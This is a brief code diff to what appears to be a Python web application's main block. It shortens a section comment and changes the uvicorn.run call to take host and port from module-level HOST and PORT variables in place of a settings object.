-# ============================================================================
-# 12. MAIN
-# ============================================================================
-
+# ========== MAIN ==========
 if __name__ == "__main__":
-    uvicorn.run("app:app", host=settings.HOST, port=settings.PORT, log_level="info")
+    uvicorn.run("app:app", host=HOST, port=PORT, log_level="info")
